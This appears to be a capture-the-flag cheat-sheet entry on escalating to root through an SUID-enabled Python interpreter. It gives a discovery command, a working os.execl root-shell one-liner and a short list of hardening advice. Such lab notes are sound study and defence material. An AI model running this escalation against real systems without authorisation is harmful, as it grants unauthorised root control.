# SUID Python Privilege Escalation

Used on: **rrootme**

If the Python interpreter has the SUID bit set, any script or command executed through it runs with the privileges of the file owner (usually root). Unlike Bash, Python does not drop privileges when executed as an SUID binary, allowing for trivial root shell spawning.

## Prerequisites

- Shell as a low-privilege user.
- A Python interpreter with the SUID bit set.

## Discovery

```bash
find / -perm -u=s -type f 2>/dev/null
# /usr/bin/python2.7
```

## Exploit

Use Python's `os` module to spawn a shell. Since the process already has an effective UID of 0, `execl` or `system` will spawn a shell retaining those privileges.

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

*Note: The `-p` flag in `sh -p` or `bash -p` tells the shell not to drop effective privileges (though many modern shells do not drop privileges when spawned by a non-setuid program if the EUID is already 0).*

### Verification

```bash
whoami
# root
```

## Defensive Notes

- Never set the SUID bit on language interpreters (`python`, `perl`, `ruby`, `bash`, `sh`).
- If scripts need to run as root, execute them via `sudo` with strict `NOPASSWD` rules mapped to absolute script paths, not the interpreter itself.
